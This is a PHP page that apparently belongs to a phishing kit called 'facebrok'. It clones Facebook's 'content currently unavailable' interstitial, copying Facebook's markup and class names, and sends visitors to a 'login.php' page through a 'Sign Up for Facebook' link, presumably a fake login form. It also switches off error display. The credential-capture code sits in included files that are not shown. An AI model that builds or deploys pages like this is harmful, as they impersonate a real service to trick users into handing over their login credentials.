<?php

	include 'croak/core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
	$facebrok->checkInstall();
	include("includes/top_2.php");
?>

<link type="text/css" rel="stylesheet" href="dynamic/6NrvphBRqWp.css" />
<link type="text/css" rel="stylesheet" href="dynamic/USqQnLMkmi6.css" />
<div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderWithImage uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h2 class="accessible_elem">This content is currently unavailable</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true"><i class="uiHeaderImage img sp_zHSMh61SOR5 sx_f600b5"></i>This content is currently unavailable</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div>The page you requested cannot be displayed right now. It may be temporarily unavailable, the link you clicked on may have expired, or you may not have permission to view this page. </div><ul class="uiList mtm _4of _4kg"><li><div class="fcb"><a href="login.php?login_attempt=1&lwv=1">Sign Up for Facebook</a></div></li></ul></div></div></div></div>


<?php
	include("includes/foot.php");
?>